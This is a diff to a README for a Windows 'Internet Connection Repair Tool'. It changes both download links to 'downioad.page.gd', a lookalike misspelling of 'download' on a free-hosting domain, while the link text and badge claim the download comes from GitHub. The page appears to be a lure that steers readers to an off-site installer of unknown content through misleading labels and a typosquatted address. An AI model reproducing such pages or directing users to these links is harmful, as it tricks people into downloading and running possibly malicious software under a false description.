@@ -2,7 +2,7 @@
 
 Internet Connection Repair Tool is a robust and user-friendly software designed to help you quickly diagnose and resolve internet connection problems on Windows 10 and Windows 11. Whether you're dealing with intermittent drops, slow speeds, or complete network failures, this portable tool provides comprehensive solutions to get you back online without hassle. It combines automated diagnostics with manual options, making it suitable for both novice users and IT professionals.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -68,7 +68,7 @@ We value your input! If you encounter bugs, have suggestions, or need assistance
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: October 2026
 
